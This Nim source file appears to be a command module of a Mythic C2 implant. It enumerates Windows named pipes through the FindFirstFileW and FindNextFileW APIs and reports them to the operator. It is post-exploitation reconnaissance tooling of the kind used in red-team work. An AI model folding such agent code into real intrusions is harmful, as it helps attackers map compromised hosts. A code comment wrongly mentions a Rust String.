import ../config
import ../utils/mythic_responses
import std/[json, strformat, strutils]

when defined(windows):
  import winim/lean
  
  proc FindFirstFileW(lpFileName: LPCWSTR, lpFindFileData: ptr WIN32_FIND_DATAW): HANDLE 
    {.importc, dynlib: "kernel32.dll", stdcall.}
  
  proc FindNextFileW(hFindFile: HANDLE, lpFindFileData: ptr WIN32_FIND_DATAW): WINBOOL 
    {.importc, dynlib: "kernel32.dll", stdcall.}
  
  proc FindClose(hFindFile: HANDLE): WINBOOL 
    {.importc, dynlib: "kernel32.dll", stdcall.}

proc listpipes*(taskId: string, params: JsonNode): JsonNode =
  ## List all named pipes on the local system
  let cfg = getConfig()
  
  when defined(windows):
    try:
      if cfg.debug:
        echo "[DEBUG] ListPipes: Enumerating named pipes"
      
      var pipes: seq[string] = @[]
      
      # Define the search path for named pipes
      let searchPath = newWideCString("\\\\.\\pipe\\*")
      
      # Initialize the WIN32_FIND_DATAW structure
      var findData: WIN32_FIND_DATAW
      
      # Call FindFirstFileW to start enumerating named pipes
      let handle = FindFirstFileW(searchPath, addr findData)
      
      if handle == INVALID_HANDLE_VALUE:
        let err = GetLastError()
        return mythicError(taskId, &"FindFirstFileW failed with error code: {err}")
      
      # Enumerate all named pipes
      block enumLoop:
        while true:
          # Convert the pipe name from UTF-16 to a Rust String
          let pipeName = $cast[WideCString](addr findData.cFileName[0])
          if pipeName.len > 0:
            pipes.add(pipeName)
          
          # Call FindNextFileW to get the next pipe
          if FindNextFileW(handle, addr findData) == 0:
            let err = GetLastError()
            if err != ERROR_NO_MORE_FILES:
              discard FindClose(handle)
              return mythicError(taskId, &"FindNextFileW failed with error code: {err}")
            break enumLoop
      
      # Close the search handle
      discard FindClose(handle)
      
      if cfg.debug:
        echo &"[DEBUG] ListPipes: Found {pipes.len} named pipes"
      
      # Prepare the response
      let output = if pipes.len == 0:
        "No named pipes found."
      else:
        &"Found {pipes.len} named pipes:\n" & pipes.join("\n")
      
      return mythicSuccess(taskId, output)
      
    except Exception as e:
      return mythicError(taskId, &"ListPipes error: {e.msg}")
  else:
    return mythicError(taskId, "listpipes command is only available on Windows")
